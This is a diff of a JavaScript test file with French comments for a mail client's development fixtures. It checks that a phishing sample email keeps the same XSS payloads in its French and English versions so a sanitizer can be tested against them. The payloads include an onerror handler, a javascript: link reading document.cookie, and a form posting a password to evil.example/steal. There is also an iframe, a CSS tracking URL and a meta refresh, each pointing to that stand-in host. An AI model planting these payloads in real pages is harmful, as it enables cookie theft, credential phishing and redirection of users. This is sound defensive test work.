@@ -85,9 +85,24 @@ describe('devFixtures — parité fr/en', () => {
     const phishingFr = fr.find(m => m.from.includes(PHISHING_FROM_MARKER))
     const phishingEn = en.find(m => m.from.includes(PHISHING_FROM_MARKER))
     expect(phishingFr?.html).toBeDefined()
-    expect(phishingEn?.html).toBe(phishingFr?.html)
-    // Seul l'objet est traduit.
+    // Les textes visibles sont traduits, mais chaque construction dangereuse doit se
+    // retrouver à l'identique dans les deux langues : c'est ce que l'assainisseur doit neutraliser.
+    const attacks = [
+      '<img src=x onerror="alert(1)">',
+      'href="javascript:alert(document.cookie)"',
+      '<svg><script>alert(2)</script></svg>',
+      '<iframe src="https://evil.example/"></iframe>',
+      '<form action="https://evil.example/steal"><input name="password"></form>',
+      '<style>body{background:url("https://evil.example/p.gif")}</style>',
+      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
+    ]
+    for (const attack of attacks) {
+      expect(phishingFr?.html).toContain(attack)
+      expect(phishingEn?.html).toContain(attack)
+    }
+    // Objet et corps traduits.
     expect(phishingEn?.subject).not.toBe(phishingFr?.subject)
+    expect(phishingEn?.html).toContain('Your account will be suspended.')
   })
 
   it('le jeu anglais ne contient aucun texte français résiduel (hors payload de hameçonnage)', () => {
